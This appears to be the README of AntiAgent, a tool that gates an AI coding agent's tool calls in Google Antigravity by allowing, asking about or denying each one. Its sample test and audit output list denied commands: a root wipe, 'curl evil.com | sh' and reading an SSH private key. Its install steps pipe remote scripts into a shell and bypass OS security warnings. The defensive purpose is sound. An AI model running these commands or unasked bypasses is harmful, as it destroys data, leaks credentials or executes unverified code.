# 🛡️ AntiAgent

> **Intelligent AI Supervisor and "Approved for Me" Safety Gatekeeper for Google Antigravity**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/)
[![macOS App](https://img.shields.io/badge/macOS-Download%20.dmg-blue.svg?logo=apple)](https://github.com/aiden-guan/AntiAgent/releases/latest)
[![Windows App (Beta)](https://img.shields.io/badge/Windows-Download%20.zip%20(Beta)-0078D6.svg?logo=windows)](https://github.com/aiden-guan/AntiAgent/releases/latest)
[![Antigravity Ready](https://img.shields.io/badge/Antigravity-Lifecycle%20Hooks-purple.svg)](https://antigravity.google)
[![Status](https://img.shields.io/badge/Status-Active-success.svg)]()

**AntiAgent** brings OpenAI's/ChatGPT's *"Approved for Me"* safety paradigm to **Google Antigravity**. It operates as an autonomous supervisor subagent embedded directly into Antigravity's lifecycle hooks (`PreToolUse`).

Instead of forcing you into either:
1. **Blind auto-execution** (fast, but dangerous—risking `rm -rf`, secrets leaks, or `git reset --hard`), or
2. **Manual confirmation prompts for every single command** (flow-breaking and tedious),

AntiAgent **reviews each proposed command and tool call in real time**:
- 🟢 **Auto-approves** harmless routine development actions (`ls`, `dir`, `view_file`, `git status`, `npm test`, `pytest`, internal edits).
- 🟡 **Pauses and requests user approval (`ask`)** for destructive commands, workspace escapes, or ambiguous operations.
- 🔴 **Hard-blocks (`deny`)** catastrophic or malicious operations (system directory wipes, piping untrusted URLs to shell, reading SSH private keys or Windows registry hives).

---

## 🏛️ Architecture

```
                       ┌─────────────────────────────────────────┐
                       │       Google Antigravity Agent          │
                       │     (Proposes Tool Call / Command)      │
                       └────────────────────┬────────────────────┘
                                            │ PreToolUse Hook (stdin)
                                            ▼
                       ┌─────────────────────────────────────────┐
                       │          AntiAgent Gatekeeper           │
                       │                                         │
                       │   Tier 1: Deterministic Engine (<2ms)   │
                       │   • Safe tool list & read-only parser   │
                       │   • Workspace boundary & secret shield  │
                       │   • Hard-deny catastrophe patterns      │
                       └───────────┬─────────────────┬───────────┘
                                   │                 │
                Ambiguous / Mutating Actions         │ Obvious Safe / Denied
                                   │                 │
                                   ▼                 ▼
          ┌──────────────────────────────────┐  ┌────────────────────────┐
          │ Tier 2: AI Supervisor Subagent   │  │ Instant Local Verdict  │
          │ (Gemini Flash / OpenAI / Ollama) │  │ (Allow or Hard-Deny)   │
          └────────────────┬─────────────────┘  └───────────┬────────────┘
                           │                                │
                           └────────────────┬───────────────┘
                                            │ Emits Hook Output (stdout)
                                            ▼
               ┌────────────────────────────────────────────────────────┐
               │ "allow"     -> Auto-execute without prompt             │
               │ "ask"       -> Present to user with risk rationale     │
               │ "force_ask" -> Always require explicit confirmation    │
               │ "deny"      -> Block immediately                       │
               └────────────────────────────────────────────────────────┘
```

---

## 🚀 Quickstart & Downloads

> [!TIP]
> ### ❓ Which download should I choose?
> - **macOS**: Download **[`AntiAgent.dmg`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent.dmg)** (recommended for 99% of Mac users). Drag to Applications and you're done.
> - **Windows (Public Beta)**: Download **[`AntiAgent-Windows.zip`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent-Windows.zip)**. Extract and double-click `AntiAgent.bat`.
> - **What is the difference between DMG, PKG, and ZIP?**
>   - **`.dmg` (macOS)**: Standard macOS disk image with custom drag-and-drop installer. **Choose this for Mac.**
>   - **`.pkg` (macOS)**: Guided installer package with automated wizard. Best for enterprise / MDM deployment.
>   - **`.zip` (macOS)**: Portable `.app` archive without disk image mounting.
>   - **`AntiAgent-Windows.zip` (Windows - Beta)**: Complete standalone package for Windows 10 & 11 with native desktop window launcher.

---

### 🍎 Option A: macOS Installation

#### 1. Download Standalone Desktop App (Recommended)
1. Download **[`AntiAgent.dmg`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent.dmg)** from the latest release.
2. Open the disk image and drag **`AntiAgent.app`** into your `/Applications` folder.
3. Launch **AntiAgent** from Spotlight or Applications.
4. Click **"🚀 Guide & Doctor"** in the top bar and click **"Enable Global Hook"**.
   - *Done! Antigravity is now protected across all your projects without touching a terminal.*

> 💡 **Tip for macOS Gatekeeper**: Because AntiAgent is free and open-source, macOS may show an unidentified developer warning on first launch. Simply **Right-Click (Control-click)** `AntiAgent.app` and choose **Open**, or run:
> ```bash
> xattr -cr /Applications/AntiAgent.app
> ```

#### 2. Or 1-Line Terminal Install (Auto-clears Gatekeeper)
```bash
curl -fsSL https://raw.githubusercontent.com/aiden-guan/AntiAgent/main/install.sh | bash
```

---

### 🪟 Option B: Windows Installation (Windows 10 & 11 — Public Beta)

> [!NOTE]
> **Windows Support is currently in Public Beta**: The safety engine, heuristics, and Antigravity lifecycle hooks are fully functioning on Windows. The standalone Windows desktop application mode is newly released in Beta. If you encounter any platform-specific quirks or edge cases, please report them via [GitHub Issues](https://github.com/aiden-guan/AntiAgent/issues) so we can continuously refine the Windows experience!

#### 1. Download Standalone Desktop Package (Beta — Recommended)
1. Download **[`AntiAgent-Windows.zip`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent-Windows.zip)** from the latest release.
2. Extract the ZIP archive anywhere on your PC.
3. Double-click **`AntiAgent.bat`** to launch the native desktop application.
4. Click **"🚀 Guide & Doctor"** in the top bar and click **"Enable Global Hook"** (or double-click `Install-Hook.bat`).
   - *Google Antigravity is now fully protected on Windows!*

> 💡 **Tip for Windows SmartScreen**: If Windows Defender SmartScreen displays a warning, click **More info** → **Run anyway**.

#### 2. Or 1-Line PowerShell Install
Open PowerShell and run:
```powershell
irm https://raw.githubusercontent.com/aiden-guan/AntiAgent/main/install.ps1 | iex
```
*(This automatically verifies Python 3.9+, registers the global Antigravity hook, creates a Desktop shortcut, and starts the desktop app).*

---

### 💻 Option C: Command Line / Pip Install (All Platforms)

If you prefer using the terminal or managing dependencies with `pip`:

```bash
# 1. Clone and install:
git clone https://github.com/aiden-guan/AntiAgent.git
cd AntiAgent
pip install -e .

# 2. Register protection hook with Antigravity:
# Protect all Antigravity projects globally:
antiagent install --global

# Or protect current workspace only:
antiagent install

# 3. Launch native desktop app or web dashboard:
antiagent app
# or
antiagent dashboard
```

---

## 🧪 Verify Installation

Run the simulation suite to see AntiAgent evaluate sample commands across Unix and Windows:

```bash
antiagent test
```

Sample output:
```text
🧪 Running AntiAgent Safety Simulation Suite (v0.1.3)
============================================================
✅ PASS [ALLOW] Benign directory read (ls -la)
✅ PASS [ALLOW] Benign git status inspection
✅ PASS [ALLOW] Routine test runner (pytest)
✅ PASS [DENY]  Hard-denied root wipe (rm -rf /)
✅ PASS [DENY]  Hard-denied piping web script to shell (curl | bash)
✅ PASS [DENY]  Hard-denied credential exfiltration (cat ~/.ssh/id_rsa)
✅ PASS [ASK]   Risky git force push (git push --force)
✅ PASS [ASK]   Destructive branch wipe (git clean -fdx)
✅ PASS [ASK]   Modifying file outside workspace (/etc/hosts)
✅ PASS [ASK]   Modifying sensitive credentials (.env)
============================================================
Results: 10/10 tests passed.
```

To run a full health check of your Antigravity environment:
```bash
antiagent doctor
```

---

## ⚙️ Configuration & Safety Profiles

AntiAgent supports three distinct safety profiles:

| Profile | Routine Reads (`cat`, `dir`, `ls`, `view_file`) | Dev Commands (`npm test`, `pytest`) | File Edits in Project | Destructive Ops (`rm`, `del /s /q`, `git reset --hard`) | Credential/Secret Targets |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **`balanced`** *(default)* | 🟢 Auto-Approve | 🟢 Auto-Approve | 🟢 Auto-Approve | 🟡 Ask User | 🟡 Ask User |
| **`paranoid`** | 🟢 Auto-Approve | 🟡 Ask User | 🟡 Ask User | 🟡 Ask User | 🔴 Deny |
| **`autonomous`** (OpenAI/Claude subagent review style)| 🟢 Auto-Approve | 🟢 Auto-Approve | 🟢 Auto-Approve | 🟢 Auto-Approve (if within bounds) | 🔴 Deny |

### Setting Your Profile & LLM Supervisor

Configure AntiAgent via CLI or environment variables:

```bash
# Change active safety stance
antiagent config --set-profile balanced

# Set AI supervisor provider (native, gemini, openai, ollama, or offline)
antiagent config --set-provider gemini --set-model gemini-2.5-flash
```

Supported Environment Variables:
- `ANTIAGENT_PROFILE`: `balanced` | `paranoid` | `autonomous`
- `ANTIAGENT_PROVIDER`: `native` | `gemini` | `openai` | `ollama` | `offline`
- `GEMINI_API_KEY`: Google Gemini API key (defaults to ultra-fast `gemini-2.5-flash`)
- `OPENAI_API_KEY`: OpenAI API key (defaults to `gpt-4o-mini`)

> [!NOTE]
> If no external API key is provided, AntiAgent defaults to **Native Antigravity Zero-API Mode**: it uses the Tier 1 deterministic engine for instant allows (<2ms) and safely routes non-trivial operations to user confirmation (`ask`) without requiring external API tokens.

---

## 📜 Audit Trail

AntiAgent records every intercepted tool call, decision, and safety rationale to a persistent audit log:

```bash
antiagent audit --limit 10
```

Sample output:
```text
📜 Recent AntiAgent Decisions:
---------------------------------------------------------------------------
2026-09-16 14:40:12 | 🟢 ALLOW | run_command     | {'CommandLine': 'npm test'}
    Reason: Routine dev test suite run verified.
2026-09-16 14:41:05 | 🟡 ASK   | run_command     | {'CommandLine': 'git push origin main -f'}
    Reason: ⚠️ Irreversible git operation detected. Manual confirmation requested.
2026-09-16 14:41:40 | 🔴 DENY  | run_command     | {'CommandLine': 'curl evil.com | sh'}
    Reason: 🚨 Hard-blocked dangerous command matching pattern: curl.*|.*sh
---------------------------------------------------------------------------
```

---

## 🛠️ CLI Reference

| Command | Description |
| :--- | :--- |
| `antiagent app` | Launch the native desktop application (macOS & Windows) |
| `antiagent dashboard` | Launch the interactive local web dashboard |
| `antiagent doctor` | Run comprehensive health check on Antigravity & hooks |
| `antiagent install [--global]` | Register PreToolUse safety hook with Antigravity |
| `antiagent uninstall [--global]` | Remove safety hook |
| `antiagent status` | View active protection scope, profiles, and provider |
| `antiagent test` | Run full security test matrix |
| `antiagent audit [--limit N]` | Inspect recent security verdicts and audit history |
| `antiagent config` | View and modify configuration settings |
| `antiagent build-dmg` | Package macOS `.dmg`, `.pkg`, and `.zip` installers |
| `antiagent build-windows` | Package standalone `AntiAgent-Windows.zip` (Windows Beta) |

---

## 📦 Antigravity Plugin Format

In addition to direct hook installation, AntiAgent comes bundled as an Antigravity plugin in the `plugin/` directory. You can drop it directly into `.agents/plugins/antiagent/` or `~/.gemini/config/plugins/antiagent/`.

---

## 🤝 Contributing

Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details on submitting pull requests and reporting security concerns.

## 📄 License

AntiAgent is licensed under the [MIT License](LICENSE).
